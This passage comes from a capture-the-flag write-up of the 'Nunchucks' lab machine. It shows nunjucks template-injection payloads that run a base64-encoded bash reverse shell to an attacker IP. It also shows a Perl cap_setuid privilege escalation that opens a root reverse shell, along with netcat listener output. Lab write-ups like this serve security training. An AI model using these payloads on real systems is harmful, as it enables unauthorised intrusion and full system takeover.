<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> base64
</span></span><span class="line"><span class="cl">YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo<span class="o">=</span>
</span></span></code></pre></div><p>Now I&rsquo;ll put that payload to david&rsquo;s home, and execute it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo= | base64 -d &gt; ~/.0mochi.sh &amp;&amp; chmod +x ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> david david <span class="m">50</span> Nov  <span class="m">5</span> 15:32 /home/david/.0mochi.sh<span class="se">\n</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span></code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>                                                      
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39352</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1009<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">david@nunchucks:/var/www/store.nunchucks$ id  
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
</span></span><span class="line"><span class="cl">david@nunchucks:/var/www/store.nunchucks$
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Under <code>/opt</code> there is a backup script written in Perl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/opt$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">19</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">838</span> Sep  <span class="m">1</span> 12:53 backup.pl
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 web_backups
</span></span><span class="line"><span class="cl">david@nunchucks:/opt$ ls web_backups/ -l
</span></span><span class="line"><span class="cl">total <span class="m">14944</span>
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:06 backup_2021-09-26-1632618416.tar
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:18 backup_2021-09-26-1632619104.tar
</span></span></code></pre></div><p>The script code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/perl</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">DBI</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nn">POSIX::</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$tmpdir</span>        <span class="o">=</span> <span class="s">&#34;/tmp&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$backup_main</span> <span class="o">=</span> <span class="s">&#39;/var/www&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$now</span> <span class="o">=</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%Y-%m-%d-%s&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$tmpbdir</span> <span class="o">=</span> <span class="s">&#34;$tmpdir/backup_$now&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">sub</span> <span class="nf">printlog</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span> <span class="s">&#34;[&#34;</span><span class="p">,</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%D %T&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">),</span> <span class="s">&#34;] $_[0]\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">sub</span> <span class="nf">archive</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printlog</span> <span class="s">&#34;Archiving...&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">printlog</span> <span class="s">&#34;Backup complete in $tmpbdir/backup_$now.tar&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="vg">$&gt;</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">die</span> <span class="s">&#34;You must run this script as root.\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Backup starts.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">&amp;</span><span class="n">archive</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Moving $tmpbdir/backup_$now to /opt/web_backups&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Removing temporary directory&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Completed&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>When I run it, I find that I passed the first if statement, which checks for root priv.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/opt$ ./backup.pl 
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Backup starts.
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Archiving...
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Backup <span class="nb">complete</span> in /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803.tar
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Moving /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803 to /opt/web_backups
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Removing temporary directory
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Completed
</span></span><span class="line"><span class="cl">david@nunchucks:/opt$ 
</span></span></code></pre></div><p>A quick check on Perl capabilities reveals that it has <code>cap_setuid+ep</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/tmp$ getcap <span class="k">$(</span>which perl<span class="k">)</span>
</span></span><span class="line"><span class="cl">/usr/bin/perl <span class="o">=</span> cap_setuid+ep
</span></span></code></pre></div><h4 id="exploit-cap_setuidep">Exploit cap_setuid+ep</h4>
<p>I tried the <a href="https://gtfobins.github.io/#perl">GTFObins</a> way to exploit the <code>cap_setuid</code> capability, but it didn&rsquo;t spawn me a root shell. However, executing <code>whoami</code> still shows that I&rsquo;m root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;</span>
</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;whoami&#34;;&#39;</span>
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>I also couldn&rsquo;t get the root flag, it returned with permission denied.</p>
<p>The next thing I tried was reusing the backup script, but with all of the code except the header stripped off and I changed the system command for executing reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/tmp$ cat .0mochi.pl 
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/perl</span>
</span></span><span class="line"><span class="cl">use strict<span class="p">;</span>
</span></span><span class="line"><span class="cl">use POSIX qw<span class="o">(</span>strftime<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">use DBI<span class="p">;</span>
</span></span><span class="line"><span class="cl">use POSIX qw<span class="o">(</span>setuid<span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">POSIX::setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ chmod +x .0mochi.pl 
</span></span></code></pre></div><p>And it worked!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39386</span>
</span></span><span class="line"><span class="cl">root@nunchucks:/tmp# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20211105233721153.png" alt="image-20211105233721153"  /></div>
</p>
<p>The flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@nunchucks:/tmp# cat /root/root.txt
</span></span><span class="line"><span class="cl">cat /root/root.txt
</span></span><span class="line"><span class="cl">1d2cc...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
